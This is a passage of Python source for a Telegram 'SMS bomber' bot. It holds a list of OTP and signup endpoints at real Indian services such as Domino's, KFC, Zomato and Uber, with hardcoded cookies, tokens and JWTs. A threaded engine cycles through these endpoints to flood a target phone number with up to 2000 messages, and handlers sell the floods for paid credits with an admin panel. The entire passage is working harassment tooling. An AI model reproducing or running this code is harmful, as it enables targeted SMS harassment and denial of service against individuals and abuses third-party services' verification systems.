            "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
            "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
            "source": "PWA18#upsellC",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://m.dominos.co.in"
        },
        "data": {"lastName": "", "mobile": target_phone, "firstName": ""}
    })

    # 48. PizzaHut
    requests_list.append({
        "method": "POST",
        "url": "https://api.pizzahut.io/v1/otp/generate",
        "headers": {
            "Host": "api.pizzahut.io",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json; charset=utf-8",
            "origin": "https://www.pizzahut.co.in"
        },
        "data": {"phone": "+91" + target_phone}
    })

    # 49. KFC
    requests_list.append({
        "method": "POST",
        "url": "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228",
        "headers": {
            "Host": "online.kfc.co.in",
            "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json;charset=UTF-8",
            "origin": "https://online.kfc.co.in",
            "cookie": "AWSALBCORS=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; AWSALB=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; bm_sv=53C041FCCE2D6FD3321A79351020FAEE~j7cP9L6VSQPYRsbqLGwt8RzkCA7V09u+MYoqGjWndCnTL4j208Z54azeQUSPERX7dHmnfetoe8Blit8FcvWB+lLO0Gio3JdGnOK81vxniNzaz/6Czf75vPN75p3DpRRdLJZVk7M3y6fx6tdmSpXyoBG7KiNxW+q5BbuJE3qcazw=; _uetvid=13d96d501f3611eb9d18c9a8fb16b76e; _uetsid=13d701c01f3611eb9030050f6efd80a0; cto_bundle=v6U7KV9RV1NKVWtoSEtBdDMya1dZTlc4b2M2dzQzM0MlMkZ1T2VoRnhDWEh1eDJ1N0k1OERVQ2lldWhsbFBMckpQeGRNdUZURmdZM0FDa3VmckJnaXdKOUJpOEpWSzQlMkZuMldDMVJkNVpnWXJmUmt1dkZSYW1wSXRvWUkzVjY5RHZXVyUyRkFGVVNJJTJGRUtZNzglMkI5NXBvcFBpOFppVmNnJTNEJTNE; _gat_UA-39424837-1=1; _fbp=fb.2.1604560269277.677327095; _gid=GA1.3.377892622.1604560269; _ga=GA1.3.414417970.1604560269; _gcl_au=1.1.1092294754.1604560267; ak_bmsc=860EE33AEA9A8D4CE7CD119FB1EC9729173A5D44517B000088A5A35F5D2C630E~plrfzJjarBUPpvI/sB4VDBhfhmuvZmyIdTSmfJO51YDwdxrYhO0dYKeemjEYuml7EVEmBBdQHQH6HS9LQu4ykNnTUlBRrT6uVYBR7TpoT6tdxQeizvLILFLVbF5pTz7NTBq5WZOF6g9erOVAkhbUIbwYYz4iCzqJCl2Wo1ylX8ymzBU6aGw/kZg4pdvpcnJUSSukS06r35CrtmMWdb97+iPdRAdyMWIEJbjdgxbSjv4d+TygRxNTcW6i2u4YdYMh2K0ecaobDsPHqhZw8158pNpw==; bm_mi=10E2246CA83B5612391BF358428BA8FF~a4AjJ6XvWPiCIqFnU4fyEM78uMiZ4SlzvPaSmlVSrOb+W72E6X9ohJm7wc2y1PLh74Iy2fUNtO+abymSudnyymsw19y9ObFoESGl0lqkXYd9MV3Ee1GWTgw0PtiiEsNTA3PF5Kn6Ch7sQWs+8uE+cToMSn2/QGSD6uT134pquP2Dz08bhPW3MgdTwFfp6+hkHftBKJFUSshzbqRDgERqde8PyHPHj4Njzgor9fND94EQrXchiz1L1ySYsHiSaaDf/qCLVJF0yXYg9Z33xk/ifAQ7cFDtvj2jCDnueLCplvM=; KFCI.A.SID_o=low4l2ltqydlp2mwtosdmg5k; KFCI.A.SID=low4l2ltqydlp2mwtosdmg5k; KFCI.IMS=False; KFCI.LC=en-US; KFCI.ReMe=False; KFCI.CHNL=All; KFCI.IPO=False; KFCI.ASD=False; KFCI.OM=None"
        },
        "data": {"phoneNumber": target_phone, "AuthorizedFor": "3", "Resend": "false"}
    })

    # 50. BurgerKing
    requests_list.append({
        "method": "POST",
        "url": "https://consumer-apis.burgerking.in/api/v1/user/signUp",
        "headers": {
            "Host": "consumer-apis.burgerking.in",
            "appversion": "1.6",
            "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70",
            "content-type": "application/json",
            "timestamp": "1604561218463",
            "userid": "TEMP6922285271604561176",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "platform": "web",
            "type": "dinein",
            "origin": "https://www.burgerking.in"
        },
        "data": {"phone_no": int(target_phone)}
    })

    # 51. Dineout
    requests_list.append({
        "method": "POST",
        "url": "https://www.dineout.co.in/xhrajaxrequest/user_signup",
        "headers": {
            "Host": "www.dineout.co.in",
            "X-Requested-With": "XMLHttpRequest",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "origin": "https://www.dineout.co.in",
            "cookie": "pwa=0; WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D; WZRK_G=c0a4edbd231e4af5975c7c0013b03754; gaClientId=403939189.1604561878; _gat=1; G_ENABLED_IDPS=google; _fbp=fb.2.1604561878472.1759911387; _col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no; _gid=GA1.3.529280843.1604561878; _ga=GA1.3.403939189.1604561878; firstUser=2; connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8; city_id=0; city_name=Delhi; firstVisit=1; countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R"
        },
        "data": f"name=Tsunami+Bomber&email=tsunami%40gmail.com&phone={target_phone}"
    })

    # 52. Purplle
    requests_list.append({
        "method": "GET",
        "url": f"https://www.purplle.com/api/account/authorization/send_otp?phone={target_phone}&action=register",
        "headers": {
            "Host": "www.purplle.com",
            "device_id": "TEC3cjyVJhEFPGsSHw",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs",
            "origin": "https://www.purplle.com",
            "cookie": "sessionExpiryTime=1604564806; _cfruid=20a4bcebdd179c4e63fbbeb0d6271eef3e5ec651-1604563004; cf_bm=9b13a29b50f7e10544e41f92eb7dd146692e3d7e-1604563004-1800-AW3mGq8peEPN0yAegFSPA95oysBWcvWDsh8ey4YhGG03hJHlYCNKYfyIAEfNhKm5b9SwcQd6bgGY1aSlO18xR1Y=; _fbp=fb.1.1604562970512.1162148084; _gat_UA-28132362-1=1; _gcl_marco=1.1981215102.1604562967; _gid=GA1.2.990407877.1604562967; _ga=GA1.2.279546588.1604562967; _gcl_au=1.1.1568865454.1604562965; g_state={\"i_p\":1604570161363,\"i_l\":1}; cto_bundle=WnK_wl9wUEtvUHhZcDc2UFFvVXpKdGNhUW9pR1g5M01YZ3VSJTJCYk1wUkJvUXJ5eEolMkZrTEVqWDRQOVZ2TWhLSXpQcEl3cnlYS09tZHM5UUxCSDdsUThBY2x3UTdBS29iR29odnJSUnFUTUQ1ZGVQa3hxdFhmNFpLZyUyRmdTaXYlMkZObzB3bVpNTnBPWENTQ0E5JTJGRkZocnBLTHBnYWt3JTNEJTNE; isSessionDetails=true; session_id=e01c026cfe88113e8f8903e0a42f0a3b; sessionCreatedTime=1604562951; environment=prod; client_ip=2401%3A4900%3A45dc%3A3edf%3A9d7d%3A63b9%3A43d%3A5e4a; session_initiated=Direct; _tmpsess=TEC3cjyVJhEFPGsSHw_1604562950; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs; visitorppl=TEC3cjyVJhEFPGsSHw; mode_device=mobile; _cfduid=d9295b4e312bb8c952cfa125eeae5ea1b1604562949"
        }
    })

    # 53. Angel Broking (multiple)
    for _ in range(3):
        requests_list.append({
            "method": "POST",
            "url": "https://www.angelbroking.com/form-gateways/oda-form.php",
            "headers": {
                "Host": "www.angelbroking.com",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.angelbroking.com",
                "cookie": "umqSiteTimer=0; 19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpMnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q; gat_UA-1186489-17=1; umqorderVal2=%229519874704%22; storejs=%22storejs%22; PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/; lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _lo_v=1; _lorid=156545-1604563454540-8a19f094f5338582; _lo_uid=156545-1604563454540-7e143755be6613e0; LandPageCookie=https://www.angelbroking.com/; SourceMediumCookie30=direct/none; CookieSourceMedium=direct/none; _fbp=fb.1.1604563209374.2038457169; _gid=GA1.2.113287213.1604563179; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gcl_au=1.1.229780243.1604563178; _cfduid=de733792a27631a027bfa486e16f221d41604563134"
            },
            "data": f"name=Tsunami+Bomber&mobile={target_phone}&city=pune&web_placement_id=21&ref_url=-&page_url=%2Fopen-demat-account%2F&post-id=2752"
        })

    # 54. ASVM Faizabad (school registration)
    requests_list.append({
        "method": "POST",
        "url": "http://asvmfaizabad.org/register.php",
        "headers": {
            "Host": "asvmfaizabad.org",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "http://asvmfaizabad.org"
        },
        "data": f"sname=Tsunami&sclass=XII&sphone={target_phone}&spassword=tsunamiastronomia&ssection=A&submit="
    })

    # ========== ADDITIONAL STABLE APIS ==========
    # 55. Zomato extra
    requests_list.append({
        "method": "POST",
        "url": "https://www.zomato.com/webroutes/auth/login",
        "headers": {
            "Host": "www.zomato.com",
            "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://www.zomato.com",
            "cookie": "g_state={\"i_p\":1603892852968,\"i_l\":1}; AWSALBTGCORS=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; AWSALBTG=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; _uetvid=4f6b1b10191311ebb65cabc7eb49e843; _uetsid=4f69c050191311eba1032d186f404b1a; G_ENABLED_IDPS=google; _fbp=fb.1.1603885628996.1156015945; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1605422707.1603885626; _gid=GA1.2.1616354908.1603885626; _ga=GA1.2.1373047799.1603885626; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=D218CC214FA71C400C71BCF2A3F35579B855DCCF7E2E0000385A995FC9E77F4B~plAF7CBZ4PUj3czKvHvfBmp17I7Gj84YwU/0/+iZ5dRIj4xWHOwmKUWPdyTqKBKi3TE3lM8CxyfsMzbyYuRmFcpDpfOCdd4K430P5HBMYUsQw6Q2mFqX2Sa9XmIq1UHabDzo9aakYe1BEM/3nLCDxoeuEVJ71uQ2Njm/dq/49iGxDmhDChYPLpOeyxqL2CKhK9QR0dzFme5AYD0/RDjh81kY7WBkfgnz5NoX1N+t69fQA=; csrf=74a094f89ea708a8f3b78c9a6df38349; PHPSESSID=de653951716ab490d5639700c776d524; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23"
        },
        "data": {"country_id": 1, "phone": target_phone, "verification_type": "sms", "method": "phone"}
    })

    # 56. Uber (India)
    requests_list.append({
        "method": "POST",
        "url": "https://auth.uber.com/api/v1/signup",
        "headers": {
            "Host": "auth.uber.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://auth.uber.com"
        },
        "data": {"phone": target_phone, "country_code": "+91"}
    })

    # 57. Ola additional
    requests_list.append({
        "method": "POST",
        "url": "https://accounts.olacabs.com/api/v1/login",
        "headers": {
            "Host": "accounts.olacabs.com",
            "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
            "content-type": "application/json",
            "origin": "https://accounts.olacabs.com"
        },
        "data": {"mobileNumber": target_phone, "dialingCode": "+91", "countryCode": "IN"}
    })

    return requests_list

# ================== BOMBING ENGINE WITH CORRECT COUNT ==================
bombing_processes = {}
bomb_stop_flags = {}
bomb_progress = {}

def bomb_job(user_id, target, country_code, count, message_id, chat_id):
    """Send exactly `count` requests, cycling through APIs randomly."""
    api_list = get_api_requests(target, country_code)
    if not api_list:
        update_bomb_progress(user_id, chat_id, message_id, target, 0, 0, 0, count, final=True, error="No APIs available.")
        return

    # Shuffle to diversify requests
    random.shuffle(api_list)
    successful = 0
    failed = 0
    sent = 0
    total = count  # exact number of requests

    bomb_progress[user_id] = {
        'sent': 0,
        'successful': 0,
        'failed': 0,
        'total': total,
        'target': target
    }

    last_update = 0

    # Loop until sent == count
    while sent < count:
        if bomb_stop_flags.get(user_id, False):
            break
        for req in api_list:
            if sent >= count or bomb_stop_flags.get(user_id, False):
                break
            try:
                if req['method'] == 'GET':
                    resp = requests.get(req['url'], headers=req.get('headers', {}), params=req.get('params'), timeout=10)
                else:
                    resp = requests.post(req['url'], headers=req.get('headers', {}),
                                         json=req.get('data') if isinstance(req.get('data'), dict) else None,
                                         data=req.get('data') if isinstance(req.get('data'), str) else None,
                                         timeout=10)
                # Consider any 2xx or 3xx as success; if status >= 400, failed
                if resp.status_code < 400:
                    successful += 1
                else:
                    failed += 1
            except Exception:
                failed += 1
            sent += 1
            bomb_progress[user_id]['sent'] = sent
            bomb_progress[user_id]['successful'] = successful
            bomb_progress[user_id]['failed'] = failed

            if sent - last_update >= 10 or bomb_stop_flags.get(user_id, False) or sent >= count:
                last_update = sent
                update_bomb_progress(user_id, chat_id, message_id, target, sent, successful, failed, total)
            time.sleep(0.1)  # small delay to avoid rate limiting

    # Final update after loop ends
    update_bomb_progress(user_id, chat_id, message_id, target, sent, successful, failed, total, final=True)
    save_history(user_id, target, sent)
    # Cleanup
    bomb_stop_flags.pop(user_id, None)
    bomb_progress.pop(user_id, None)
    bombing_processes.pop(user_id, None)

def update_bomb_progress(user_id, chat_id, message_id, target, sent, successful, failed, total, final=False, error=None):
    if error:
        text = f"❌ Error: {error}"
        bot.edit_message_text(text, chat_id, message_id, parse_mode="HTML")
        return

    if total == 0:
        percent = 0
    else:
        percent = min(100, int((sent / total) * 100))

    filled = int(percent / 5)
    bar = "█" * filled + "░" * (20 - filled)

    status_text = "✅ COMPLETED" if final or sent >= total else "⏳ IN PROGRESS"
    if bomb_stop_flags.get(user_id, False) and not final:
        status_text = "🛑 STOPPED"

    text = f"""
╔══════════════════════╗
║ ☠️ SHR SMS BOMBER BOT ☠️   
╠══════════════════════╣
║  📱 TARGET  : <code>{target}</code>
║  📊 STATUS  : {status_text}
║  🧩 PROGRESS: [{bar}] {percent}%
║  📨 SENT    : {sent}
║  ✅ SUCCESS : {successful}
║  ❌ FAILED  : {failed}
║  🎯 TOTAL   : {total}
╚══════════════════════╝
"""
    try:
        if final or sent >= total:
            kb = None
            bot.edit_message_text(text, chat_id, message_id, parse_mode="HTML", reply_markup=kb)
        else:
            kb = InlineKeyboardMarkup()
            kb.add(InlineKeyboardButton("🛑 STOP BOMB", callback_data=f"stop_bomb_{user_id}"))
            bot.edit_message_text(text, chat_id, message_id, parse_mode="HTML", reply_markup=kb)
    except Exception as e:
        logger.warning(f"Progress update failed: {e}")

# ================== BOT HANDLERS ==================
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    if FORCE_SUB and not is_user_in_channel(user_id):
        send_force_sub(message.chat.id)
        return
    user_data = get_or_create_user(user_id, username=message.from_user.username)
    if is_banned(user_id):
        bot.reply_to(message, "🚫 You are banned.")
        return

    photos = bot.get_user_profile_photos(user_id)
    caption = f"""
🦋 <b>SHR SMS BOOMBER BOT</b> 🦋
━━━━━━━━━━━━━━━━━━━━━
👤 <b>Name</b> : {message.from_user.first_name}
🆔 <b>User ID</b> : <code>{user_id}</code>
━━━━━━━━━━━━━━━━━━━━━
💳 <b>Credits</b> : {user_data['credits']}
━━━━━━━━━━━━━━━━━━━━━
Use the buttons below to start bombing.
"""
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("💣 Start Bomb", callback_data="start_bomb"),
        InlineKeyboardButton("💰 Credits", callback_data="check_credits"),
        InlineKeyboardButton("👥 Refer", callback_data="refer"),
        InlineKeyboardButton("📋 History", callback_data="history"),
        InlineKeyboardButton("❓ Help", callback_data="help"),
    )
    if user_id in ADMIN_IDS:
        kb.add(InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel"))

    if photos.total_count > 0:
        file_id = photos.photos[0][-1].file_id
        bot.send_photo(message.chat.id, file_id, caption=caption, parse_mode="HTML", reply_markup=kb)
    else:
        bot.send_message(message.chat.id, caption, parse_mode="HTML", reply_markup=kb)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id
    message = call.message
    if FORCE_SUB and not is_user_in_channel(user_id):
        send_force_sub(message.chat.id)
        bot.answer_callback_query(call.id, "Join channel first.")
        return

    if is_banned(user_id) and user_id not in ADMIN_IDS:
        bot.answer_callback_query(call.id, "Banned.")
        return

    data = call.data

    if data.startswith("stop_bomb_"):
        uid = int(data.split("_")[2])
        if uid == user_id or user_id in ADMIN_IDS:
            bomb_stop_flags[uid] = True
            bot.answer_callback_query(call.id, "🛑 Stopping bomb...")
        else:
            bot.answer_callback_query(call.id, "You can only stop your own bomb.")
        return

    if data == "check_sub":
        bot.answer_callback_query(call.id)
        if is_user_in_channel(user_id):
            bot.delete_message(message.chat.id, message.message_id)
            start_cmd(message)
        else:
            send_force_sub(message.chat.id)

    elif data == "start_bomb":
        bot.answer_callback_query(call.id)
        credits = get_credits(user_id)
        if credits < 1:
            bot.send_message(message.chat.id, "❌ You have 0 credits. Please contact admin to buy credits.", parse_mode="HTML")
            return
        # Country selection
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton("🇮🇳 India (+91)", callback_data="country_91"),
            InlineKeyboardButton("🇧🇩 Bangladesh (+880)", callback_data="country_880")
        )
        kb.add(InlineKeyboardButton(" 🌎 Others country", callback_data="country_manual"))
        kb.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
        bot.send_message(message.chat.id, "🌍 Select country code:", reply_markup=kb)

    elif data.startswith("country_"):
        if data == "country_manual":
            bot.answer_callback_query(call.id)
            msg = bot.send_message(message.chat.id, "📞 Send number with country code (e.g., `+91 9876543210` or `880 1234567890`):", parse_mode="Markdown")
            bot.register_next_step_handler(msg, process_manual_number)
            return
        country_code = data.split("_")[1]
        if country_code not in ["91", "880"]:
            bot.answer_callback_query(call.id, "Unsupported country.")
            return
        bot.answer_callback_query(call.id)
        msg = bot.send_message(message.chat.id, f"📞 Send the phone number (digits only) for country code +{country_code}:")
        bot.register_next_step_handler(msg, process_number, country_code)

    elif data == "cancel":
        bot.answer_callback_query(call.id)
        bot.edit_message_text("❌ Cancelled.", message.chat.id, message.message_id)

    elif data == "check_credits":
        bot.answer_callback_query(call.id)
        credits = get_credits(user_id)
        bot.send_message(message.chat.id, f"💰 Your current credits: <code>{credits}</code>", parse_mode="HTML")

    elif data == "refer":
        bot.answer_callback_query(call.id)
        bot_link = f"https://t.me/{bot.get_me().username}?start={user_id}"
        referrals = get_referral_count(user_id)
        bot.send_message(
            message.chat.id,
            f"👥 <b>Referral Program</b>\n\n"
            f"You have referred: <b>{referrals}</b> friends.\n"
            f"Earn <b>1 bonus credit</b> for every 3 referrals.\n\n"
            f"Your referral link:\n<code>{bot_link}</code>\n\n"
            f"Share this link and earn!",
            parse_mode="HTML"
        )

    elif data == "history":
        bot.answer_callback_query(call.id)
        conn = get_db_connection()
        cur = conn.cursor()
        cur.execute("SELECT target, count, created_at FROM history WHERE user_id = ? ORDER BY id DESC LIMIT 5", (user_id,))
        rows = cur.fetchall()
        conn.close()
        if not rows:
            bot.send_message(message.chat.id, "📋 No history yet.")
        else:
            text = "📋 <b>Last 5 bombing sessions:</b>\n\n"
            for row in rows:
                text += f"📱 {row['target']} – {row['count']} requests on {row['created_at'][:10]}\n"
            bot.send_message(message.chat.id, text, parse_mode="HTML")

    elif data == "help":
        bot.answer_callback_query(call.id)
        bot.send_message(
            message.chat.id,
            "❓ <b>Help Guide</b>\n\n"
            "1. Click 'Start Bomb' to begin.\n"
            "2. Select country (India or Bangladesh) or enter manually.\n"
            "3. Enter the phone number.\n"
            "4. Choose the number of messages (50/100/200/500/Unlimited).\n"
            "5. Cost: 50/100 = 1 credit, 200/500 = 3 credits, Unlimited = 10 credits.\n"
            "6. Bombing will start with a live progress bar.\n"
            "7. You can stop anytime using the 'Stop Bomb' button.\n"
            "8. Refer friends to earn bonus credits.\n"
            "9. Contact admin for more credits.\n\n"
            "⚠️ Use responsibly.",
            parse_mode="HTML"
        )

    elif data == "admin_panel" and user_id in ADMIN_IDS:
        bot.answer_callback_query(call.id)
        kb = InlineKeyboardMarkup()
        kb.add(
            InlineKeyboardButton("➕ Add Credits", callback_data="admin_add"),
            InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove"),
        )
        kb.add(
            InlineKeyboardButton("🔒 Ban User", callback_data="admin_ban"),
            InlineKeyboardButton("🔓 Unban User", callback_data="admin_unban"),
        )
        kb.add(
            InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
            InlineKeyboardButton("👥 All Users", callback_data="admin_list"),
        )
        kb.add(InlineKeyboardButton("🔙 Back", callback_data="back_main"))
        bot.send_message(message.chat.id, "⚙️ Admin Panel", reply_markup=kb)

    elif data.startswith("admin_") and user_id in ADMIN_IDS:
        bot.answer_callback_query(call.id)
        action = data.split("_")[1]
        if action == "add":
            msg = bot.send_message(message.chat.id, "Send: `user_id credits` (e.g., `123 10`)", parse_mode="Markdown")
            bot.register_next_step_handler(msg, admin_credit_action, "add")
        elif action == "remove":
            msg = bot.send_message(message.chat.id, "Send: `user_id credits` (e.g., `123 5`)", parse_mode="Markdown")
            bot.register_next_step_handler(msg, admin_credit_action, "remove")
        elif action == "ban":
            msg = bot.send_message(message.chat.id, "Send user ID to ban:")
            bot.register_next_step_handler(msg, admin_ban_action, True)
        elif action == "unban":
            msg = bot.send_message(message.chat.id, "Send user ID to unban:")
            bot.register_next_step_handler(msg, admin_ban_action, False)
        elif action == "broadcast":
            msg = bot.send_message(message.chat.id, "Send your broadcast message:")
            bot.register_next_step_handler(msg, admin_broadcast_action)
        elif action == "list":
            rows = get_all_users()
            if not rows:
                bot.send_message(message.chat.id, "No users.")
            else:
                text = "👥 All Users:\n"
                for row in rows:
                    text += f"`{row['user_id']}` – @{row['username'] or 'unknown'} – {row['credits']} credits\n"
                bot.send_message(message.chat.id, text, parse_mode="Markdown")

    elif data == "back_main":
        bot.answer_callback_query(call.id)
        bot.delete_message(message.chat.id, message.message_id)
        start_cmd(message)

    elif data.startswith("count_"):
        temp = USER_STATE.get(user_id)
        if not temp:
            bot.answer_callback_query(call.id, "Session expired. Start again.")
            return
        country_code = temp['country']
        number = temp['number']
        count_option = data.split("_")[1]
        count_map = {
            '50': (50, 1),
            '100': (100, 1),
            '200': (200, 3),
            '500': (500, 3),
            'unlimited': (2000, 10)  # 2000 requests
        }
        if count_option not in count_map:
            bot.answer_callback_query(call.id, "Invalid choice.")
            return
        count, cost = count_map[count_option]
        credits = get_credits(user_id)
        if credits < cost:
            bot.answer_callback_query(call.id, f"Insufficient credits. Need {cost}, you have {credits}.")
            bot.send_message(message.chat.id, f"❌ You need <b>{cost}</b> credits for {count} messages, but you have only <b>{credits}</b>.\nContact admin to buy credits. @the_silent_hacker_raj ", parse_mode="HTML")
            return
        remove_credits(user_id, cost)
        bot.answer_callback_query(call.id, f"✅ {cost} credits deducted. Starting bomb...")
        progress_msg = bot.send_message(message.chat.id, " 🔎 Scan the number...")
        thread = threading.Thread(target=bomb_job, args=(user_id, number, country_code, count, progress_msg.message_id, message.chat.id))
        bombing_processes[user_id] = thread
        bomb_stop_flags[user_id] = False
        thread.start()
        USER_STATE.pop(user_id, None)

# ================== STATE FOR COUNT SELECTION ==================
USER_STATE = {}  # user_id -> {'country': code, 'number': num}

def process_number(message, country_code):
    user_id = message.from_user.id
    number = message.text.strip()
    if not number.isdigit() or len(number) < 7:
        bot.reply_to(message, "❌ Please enter a valid phone number (only digits).")
        return
    USER_STATE[user_id] = {'country': country_code, 'number': number}
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("50 (1 credit)", callback_data="count_50"),
        InlineKeyboardButton("100 (1 credit)", callback_data="count_100"),
        InlineKeyboardButton("200 (3 credits)", callback_data="count_200"),
        InlineKeyboardButton("500 (3 credits)", callback_data="count_500"),
        InlineKeyboardButton("Unlimited (10 credits)", callback_data="count_unlimited")
    )
    kb.add(InlineKeyboardButton("❌ Cancel", callback_data="cancel"))
    bot.reply_to(message, "📊 Select the number of messages to send:", reply_markup=kb)

def process_manual_number(message):
    user_id = message.from_user.id
